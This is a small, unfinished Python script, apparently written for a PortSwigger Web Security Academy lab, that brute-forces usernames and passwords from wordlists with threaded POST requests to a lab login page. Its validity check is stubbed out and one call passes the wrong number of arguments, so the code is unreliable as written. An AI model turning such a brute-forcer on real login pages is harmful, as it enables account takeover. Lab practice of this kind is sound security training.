#!/usr/bin/python

import threading

import requests

# used to solve this lab https://portswigger.net/web-security/authentication/password-based

URL = "https://ac4a1f4d1e0a2f2d80711dc8005d00d5.web-security-academy.net/login"

first_resp = ""


def is_valid_payload(params):
    req = requests.post(URL, data=params)
    #  if first_resp == "":
    #      first_resp += req.text
    #  return req.text.find(invalid_keyword) == -1
    print("hello")


username = "at"
password = ""


def brute_usernames():
    with open("usernames") as usernames:
        line = usernames.readline()
        line = line[:-1]
        #  print(f"try username {line}")
        params = {"username": line, "password": "password"}
        is_valid_payload(params)

        while True:
            line = usernames.readline()
            line = line[:-1]
            if not line:
                break
            #  print(f"try username {line}")
            params = {"username": line, "password": "password"}
            temp = threading.Thread(target=is_valid_payload, args=[params])
            temp.start()


def brute_passwords():
    with open("passwords") as passwords:
        while True:
            line = passwords.readline()
            line = line[:-1]
            if not line:
                break
            print(f"try password {line}")
            params = {
                "username": username,
                "password": line,
            }
            if is_valid_payload(params, "Incorrect"):
                print(f"password: {line}")
                break


brute_usernames()
